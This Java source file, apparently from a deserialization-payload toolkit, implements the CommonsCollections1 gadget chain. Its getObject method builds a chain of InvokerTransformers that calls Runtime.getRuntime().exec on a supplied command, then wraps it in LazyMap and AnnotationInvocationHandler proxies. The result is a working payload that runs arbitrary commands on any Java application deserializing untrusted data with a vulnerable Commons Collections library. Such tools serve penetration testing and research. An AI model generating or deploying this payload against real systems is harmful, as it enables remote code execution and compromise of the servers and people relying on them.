package com.xyuxu.javasec.core.payload.gadgets;


import com.xyuxu.javasec.utils.Reflections;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.lang.annotation.Target;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;


public class CommonsCollections1 implements ObjectPayload {
    @Override
    public InvocationHandler getObject(final String command) throws Exception {

        final Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[]{}}),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[]{}}),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{command}),
                new ConstantTransformer(1)
        };

        final ChainedTransformer chainedTransformer = new ChainedTransformer(
                new Transformer[]{
                        new ConstantTransformer(1)
                }
        );

        final Map innerMap = new HashMap();
        final Map<Object,Object> lazyMap = LazyMap.decorate(innerMap, chainedTransformer);


        final InvocationHandler invocationHandler=
               Reflections.createInstance(
                        "sun.reflect.annotation.AnnotationInvocationHandler",
                        new Class[]{Class.class,Map.class},
                        new Object[]{Target.class, lazyMap}
                );

        final Map proxyMap =(Map) Proxy.newProxyInstance(
                LazyMap.class.getClassLoader(),
                new Class[]{Map.class},
                invocationHandler
        );

        Reflections.setFieldValue(chainedTransformer,"iTransformers",transformers);

        return Reflections.createInstance(
                "sun.reflect.annotation.AnnotationInvocationHandler",
                new Class[]{Class.class,Map.class},
                new Object[]{Target.class, proxyMap}
        );

    }


}





















